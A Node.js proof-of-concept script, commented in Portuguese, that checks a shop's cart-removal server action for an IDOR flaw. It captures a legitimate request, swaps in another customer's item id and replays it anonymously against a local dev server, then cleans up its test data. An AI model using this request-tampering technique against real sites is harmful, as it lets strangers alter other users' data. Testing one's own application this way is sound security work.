// PoC — IDOR / Broken Access Control em removeCartItem (src/actions/cart.ts)
// Prova que um atacante SEM LOGIN e SEM o carrinho da vítima consegue apagar
// um item do carrinho de outra pessoa, bastando conhecer o id do item.
//
// Uso: node scripts/poc-cart-idor.cjs   (com o dev server na porta 3000)
require("dotenv/config");
const { chromium } = require("playwright-core");
const { PrismaClient } = require("@prisma/client");

const EDGE = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
const BASE = process.env.POC_BASE || "http://localhost:3000";
const prisma = new PrismaClient();

const log = (...a) => console.log(...a);

(async () => {
  // 1) Produto qualquer + carrinhos de VÍTIMA e ATACANTE (via banco, determinístico)
  const product = await prisma.product.findFirst({
    where: { active: true, stock: { gt: 0 } },
    select: { id: true, name: true },
  });
  const stamp = Date.now();
  const victimCart = await prisma.cart.create({ data: { sessionToken: `victim-poc-${stamp}` } });
  const victimItem = await prisma.cartItem.create({
    data: { cartId: victimCart.id, productId: product.id, qty: 1 },
  });
  const attackerCart = await prisma.cart.create({ data: { sessionToken: `attacker-poc-${stamp}` } });
  const attackerItem = await prisma.cartItem.create({
    data: { cartId: attackerCart.id, productId: product.id, qty: 1 },
  });
  log(`Produto alvo: ${product.name}`);
  log(`Item da VÍTIMA   : ${victimItem.id}`);
  log(`Item do ATACANTE : ${attackerItem.id}`);

  const browser = await chromium.launch({ executablePath: EDGE });

  // 2) Atacante abre a PRÓPRIA sacola e remove o PRÓPRIO item — só para
  //    capturar o formato da chamada da server action (id + headers + body).
  const ctx = await browser.newContext();
  await ctx.addCookies([
    { name: "fv_cart", value: `attacker-poc-${stamp}`, url: BASE },
  ]);
  const page = await ctx.newPage();

  let captured = null;
  page.on("request", (req) => {
    if (
      req.method() === "POST" &&
      req.url().includes("/sacola") &&
      req.headers()["next-action"]
    ) {
      captured = { url: req.url(), headers: req.headers(), body: req.postData() };
    }
  });

  await page.goto(`${BASE}/sacola`, { waitUntil: "networkidle" });
  const removeBtn = page.getByRole("button", { name: /Remover/i }).first();
  if (!(await removeBtn.count())) {
    log("❌ Não renderizou o item do atacante na /sacola (sessão não pegou).");
    process.exit(2);
  }
  await removeBtn.click();
  await page.waitForTimeout(2500);

  if (!captured) {
    log("❌ Não capturei a chamada da server action.");
    process.exit(2);
  }
  log(`\nChamada capturada: next-action=${captured.headers["next-action"]}`);
  log(`Body: ${captured.body}`);

  // 3) EXPLOIT — reenvia a action trocando o id do atacante pelo da VÍTIMA,
  //    de um contexto NOVO, SEM cookies (atacante anônimo, não logado).
  const exploitBody = captured.body.split(attackerItem.id).join(victimItem.id);
  const headers = { ...captured.headers };
  delete headers.cookie;        // prova: nenhuma sessão
  delete headers["content-length"];
  delete headers.host;

  const anon = await browser.newContext(); // sem cookies
  const res = await anon.request.post(captured.url, { headers, data: exploitBody });
  log(`\nExploit (anônimo) -> HTTP ${res.status()}`);

  await page.waitForTimeout(1500);

  // 4) Verifica no banco se o item da VÍTIMA foi apagado por um estranho
  const still = await prisma.cartItem.findUnique({ where: { id: victimItem.id } });
  log("\n════════ RESULTADO ════════");
  if (!still) {
    log("🔴 VULNERÁVEL: o item da vítima foi APAGADO por um atacante sem login.");
    log("   IDOR confirmado em removeCartItem (sem checagem de dono/sessão).");
  } else {
    log("🟢 Protegido: o item da vítima continua intacto (acesso negado).");
  }

  // limpeza dos carrinhos de teste
  await prisma.cart.deleteMany({
    where: { sessionToken: { in: [`victim-poc-${stamp}`, `attacker-poc-${stamp}`] } },
  });
  await browser.close();
  await prisma.$disconnect();
  process.exit(still ? 0 : 1);
})().catch(async (e) => {
  console.error("ERRO:", e.message.split("\n")[0]);
  try { await prisma.$disconnect(); } catch {}
  process.exit(2);
});
